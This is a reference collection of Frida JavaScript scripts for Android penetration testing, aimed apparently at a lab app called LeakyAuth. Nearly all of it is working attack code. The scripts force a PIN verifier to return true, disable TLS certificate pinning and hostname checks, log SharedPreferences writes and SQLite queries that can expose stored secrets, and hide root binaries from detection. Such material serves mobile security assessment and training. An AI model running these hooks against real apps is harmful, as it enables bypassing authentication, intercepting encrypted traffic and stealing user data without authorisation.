# Frida Scripts Collection for Android Penetration Testing

A reference collection of essential **Frida (JavaScript)** snippets to dynamically instrument and bypass Android security controls during mobile assessments.

---

## 1. Running Frida

```bash
# Attach to running process by package name
frida -U -f com.pentestlab.leakyauth -l bypass_pin.js

# Spawn and inject early before app initializes
frida -U -f com.pentestlab.leakyauth -l bypass_pin.js --no-pause
```

---

## 2. Bypassing Client-Side PIN Validation (Target: LeakyAuth)

```javascript
/* bypass_pin.js */
Java.perform(function () {
    console.log("[*] Hooking PinVerifier.verifyPin...");
    var PinVerifier = Java.use("com.pentestlab.leakyauth.PinVerifier");

    PinVerifier.verifyPin.implementation = function (pin) {
        console.log("[+] Intercepted PIN attempt: " + pin);
        console.log("[+] Forcing verifyPin() to return TRUE");
        return true;
    };
});
```

---

## 3. Universal SSL Pinning Bypass (Target: Android HttpsURLConnection / TrustManager)

```javascript
/* ssl_bypass.js */
Java.perform(function () {
    console.log("[*] Injecting Universal SSL Pinning Bypass...");

    // 1. Hook TrustManagerImpl
    var TrustManagerImpl = Java.use("com.android.org.conscrypt.TrustManagerImpl");
    if (TrustManagerImpl) {
        TrustManagerImpl.verifyChain.implementation = function (untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {
            console.log("[+] Bypassing TrustManagerImpl.verifyChain for host: " + host);
            return untrustedChain;
        };
    }

    // 2. Trust all certificates for HttpsURLConnection
    var HttpsURLConnection = Java.use("javax.net.ssl.HttpsURLConnection");
    HttpsURLConnection.setDefaultHostnameVerifier.implementation = function (verifier) {
        console.log("[+] Disabling HostnameVerifier...");
    };
});
```

---

## 4. Dumping Plaintext SharedPreferences Operations

```javascript
/* dump_shared_prefs.js */
Java.perform(function () {
    console.log("[*] Hooking SharedPreferences Editor writes...");

    var Editor = Java.use("android.app.SharedPreferencesImpl$EditorImpl");

    Editor.putString.implementation = function (key, value) {
        console.log("[SharedPrefs Write] Key: '" + key + "' => Value: '" + value + "'");
        return this.putString(key, value);
    };

    Editor.putBoolean.implementation = function (key, value) {
        console.log("[SharedPrefs Write] Key: '" + key + "' => Value: " + value);
        return this.putBoolean(key, value);
    };
});
```

---

## 5. Intercepting SQLite Queries at Runtime

```javascript
/* hook_sqlite.js */
Java.perform(function () {
    var SQLiteDatabase = Java.use("android.database.sqlite.SQLiteDatabase");

    SQLiteDatabase.rawQueryWithFactory.implementation = function (factory, sql, selectionArgs, editTable, cancellationSignal) {
        console.log("[SQL Query]: " + sql);
        if (selectionArgs) {
            console.log("             Args: " + Java.use("java.util.Arrays").toString(selectionArgs));
        }
        return this.rawQueryWithFactory(factory, sql, selectionArgs, editTable, cancellationSignal);
    };
});
```

---

## 6. Basic Root Detection Bypass

```javascript
/* bypass_root.js */
Java.perform(function () {
    var File = Java.use("java.io.File");

    File.exists.implementation = function () {
        var path = this.getAbsolutePath();
        if (path.indexOf("su") !== -1 || path.indexOf("busybox") !== -1 || path.indexOf("Superuser") !== -1) {
            console.log("[+] Hiding root binary check for: " + path);
            return false;
        }
        return this.exists();
    };
});
```
